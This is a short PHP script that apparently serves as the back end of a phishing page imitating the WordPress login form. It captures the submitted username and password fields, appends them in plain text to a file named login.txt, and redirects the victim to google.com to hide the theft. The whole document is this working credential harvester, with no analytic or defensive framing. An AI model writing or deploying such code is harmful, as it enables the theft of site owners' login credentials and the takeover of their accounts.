<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $log = $_POST['log'] ?? '';
    $pwd = $_POST['pwd'] ?? '';

    $data = "Wordpress Username: $log | Pass: $pwd\n";

    file_put_contents("login.txt", $data, FILE_APPEND);

    header('Location: https://google.com');
    exit();
}
?>
